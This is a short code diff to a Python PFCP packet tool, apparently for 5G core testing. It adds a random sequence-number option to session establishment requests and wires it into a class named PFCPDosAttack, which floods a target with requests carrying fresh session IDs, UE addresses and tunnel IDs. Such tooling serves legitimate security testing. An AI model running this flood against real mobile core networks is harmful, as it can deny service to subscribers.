@@ -127,7 +127,7 @@ class Ez_PFCP:
             
             
     def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
-                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1):
+                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -144,7 +144,8 @@ class Ez_PFCP:
             ue_addr=ue_addr,
             teid=teid,
             precedence=precedence,
-            interface=interface
+            interface=interface,
+            random_seq=random_seq
         )
         send(pfcp_session_establishment_req)
         if self.verbose:
@@ -275,7 +276,8 @@ class PFCPDosAttack:
                 pfcp_obj.Send_PFCP_session_establishment_req(
                     seid=self.new_seid(), 
                     ue_addr=self.new_ue_addr(),
-                    teid=self.new_teid()
+                    teid=self.new_teid(),
+                    random_seq=self.randomize
                 )
                 
             
